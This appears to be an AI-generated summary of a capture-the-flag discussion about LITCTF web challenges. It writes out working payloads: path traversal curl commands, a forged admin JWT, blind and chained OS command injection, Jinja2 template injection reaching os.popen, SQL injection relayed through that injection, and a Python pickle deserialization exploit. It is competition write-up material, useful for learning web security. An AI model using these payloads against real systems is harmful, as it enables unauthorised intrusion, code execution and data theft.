Gemini Chat Summary

Comprehensive Summary of CTF Web Challenge Discussion

This document provides a detailed analysis of a technical conversation centered on solving web security challenges from various Capture The Flag (CTF) events, with a strong focus on LITCTF. The discussion archives a variety of exploit techniques, complete solve scripts, and references to external resources. The vulnerabilities discussed range from path traversal and injection attacks to complex timing and deserialization exploits.

Key Vulnerabilities and Exploit Techniques

The conversation covers a broad spectrum of web vulnerabilities. Below is a breakdown of the primary techniques discussed, complete with explanations and the payloads used.

1. Path Traversal

A common theme was accessing restricted files by manipulating file paths. The primary tool for this was curl with the --path-as-is flag, which prevents the normalization of URL paths (e.g., collapsing /../).

  • Core Concept: Use ../ sequences to navigate up the directory tree to access sensitive files like flag.txt.
  • Payloads & Commands: 
    curl --path-as-is http://litctf.org:31778/../flag.txt
    curl http://litctf.org:31778/..%2Fflag.txt
    curl -X GET "http://litctf.org:31778/?file=../../../flag.txt"
  • Reference: An OWASP article on Path Traversal was shared for context.

2. JSON Web Token (JWT) Manipulation

Two JWT challenges were solved by tampering with the token's payload.

  • JWT-1 (Client-Side Edit): The token was decoded, the payload was modified (e.g., setting "admin":true), and then used to access a protected resource. Tools like jwt.io and token.dev were mentioned for this purpose. 
    curl --cookie 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRiYzEyMyIsImFkbWluIjp0cnVlfQ.tqNm1v5blWB0xJp3yOK73xa-ux6F7stX4yMGcOcmsL0' http://litctf.org:31781/flag
  • JWT-2 (Server-Side Logic Flaw): A flaw in the server's code was exploited. By modifying the server-side script (index.ts) to always sign tokens with admin privileges (admin: true), a valid admin token could be generated and used.

3. Timing Attacks

Several challenges were vulnerable to timing attacks, where the server's response time leaks information about the validity of a guess. Python scripts using the requests and time libraries were crafted to exploit this.

  • Core Concept: The server takes longer to respond (due to a sleep or heavy computation) when a part of the secret (e.g., a character in a password) is correct. The exploit script iterates through all possible characters, measures the response time for each, and identifies the correct one based on the delay.
  • Example Script Logic: 
    
# Pseudocode for timing attack
for position in range(password_length):
    for char in character_set:
        test_password = current_password + char + padding
        start_time = time.time()
        requests.post(url, data={'password': test_password})
        end_time = time.time()
        if (end_time - start_time) > expected_delay:
            current_password += char
            print(f'Found character: {char}')
            break
  • A similar logic was applied to a command injection vulnerability, using sleep 3 to create the timing oracle.

4. Command Injection

OS command injection was achieved by inserting shell commands into input fields that are improperly sanitized and passed to a shell environment.

  • Blind Injection (Time-Based): A timing attack was combined with command injection to exfiltrate a flag. The payload uses grep -q to check for a flag prefix and executes sleep 3 if the guess is correct. 
    hostname=;`grep -q 'LITCTF{...}' flag.txt && sleep 3`;
  • Chained Commands: A script demonstrated creating a user with a malicious username containing shell commands, which were later executed by the application logic. 
    
# Step 1: Change password to inject a username with a command
change_pw("123', username='hihi; mkdir static")
# Step 2: Trigger the command execution
trigger_cmd("hihi; mkdir static")
# Step 3: Exfiltrate flag
change_pw("123', username='hihi; cat flag* > static/hihi.txt")

5. Server-Side Template Injection (SSTI)

SSTI was used to execute code on the server by abusing template rendering engines (like Jinja2 in Flask or EJS in Node.js).

  • Payloads: The payloads traverse Python's object hierarchy to find and execute dangerous functions like os.popen. 
    {{ config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read() }}
    {{ self['__class__']['__mro__'][1]['__subclasses__']()[POPEN_NUM]('...command...') }}
  • Data Exfiltration: One advanced SSTI script used this vulnerability to make a POST request from the server to an attacker-controlled machine, exfiltrating the flag character by character.

6. SQL Injection (SQLi)

Both manual and tool-based SQLi were mentioned. A bug in sqlmap was triggered by one challenge. Manual payloads were crafted for blind SQL injection.

  • Blind SQLi Payload: A payload was used within a JSON object sent to an internal API. It uses LIKE and SQL comments to guess the flag. 
    
# Python script constructs a command to be run via SSTI, which in turn performs SQLi
user = '''python3 -c "import requests;r=requests.post(\\"http://172.24.0.8:8080/runquery\\",json={\\"username\\": \\"flag' AND password LIKE 'LITCTF{...}%' --\\",...});print(r.text)"'''

7. Cross-Site Scripting (XSS)

Several XSS techniques were discussed to bypass client-side restrictions or exfiltrate information.

  • Filename Bypass: Uploading a file with a crafted name like payload.txt/.html to bypass extension validation and have the file served as HTML.
  • History Manipulation: Using window.history.pushState to change the URL displayed in the browser, potentially for phishing or confusing the user/admin bot.
  • XMLHttpRequest Hijacking: Overriding the global XMLHttpRequest object to intercept AJAX requests and redirect data to an attacker-controlled location.

8. Insecure Deserialization (Python Pickle)

A classic Python pickle exploit was used. A malicious object was created which, when deserialized by the server, executes arbitrary code.

  • Exploit Class: A class with a custom __reduce__ method is defined to return the eval function and a command to be executed. 
    
import pickle
import base64

class Exploit():
    def __reduce__(self):
        return eval, ("str(globals())", )

payload = pickle.dumps({"name": "", "bio": Exploit()})
encoded_payload = base64.b64encode(payload)
# POST encoded_payload to the server

9. Miscellaneous Challenges

  • Race Condition: A challenge was solved by sending multiple concurrent donation requests to exploit a race condition, leading to an incorrect balance calculation and revealing the flag.
  • Simple Source Inspection: One flag was found directly in a JavaScript variable in the page's HTML source.
  • RSA Timing Attack: A script was written to exploit a timing vulnerability in an RSA decryption implementation, allowing the password to be recovered character by character.
